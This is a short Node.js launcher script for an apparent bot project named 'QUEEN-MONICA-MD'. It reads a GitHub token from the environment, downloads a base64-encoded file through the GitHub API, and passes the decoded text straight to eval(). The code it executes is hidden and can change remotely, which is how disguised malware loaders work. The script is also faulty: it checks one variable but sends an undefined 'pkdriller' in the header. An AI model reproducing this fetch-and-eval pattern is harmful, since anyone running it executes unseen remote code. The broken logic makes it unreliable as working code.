require('dotenv').config();
const axios = require('axios');
const { githubApiUrl } = require("./QUEEN-MONICA-MD/pkdriller");

const justatz = process.env.pkdriller1; // Load queen-monica from .env

if (!justatz) {
    console.error("❌ GitHub queen-monica-md is missing in .env!");
    process.exit(1);
}

axios.get(githubApiUrl, {
    headers: { Authorization: `Bearer ${pkdriller}` }
})
.then(res => {
    const fileContent = Buffer.from(res.data.content, 'base64').toString();
    console.log("✅ Script downloaded successfully!");
    eval(fileContent);
})
.catch(err => console.error("❌ Error fetching script:", err.message));
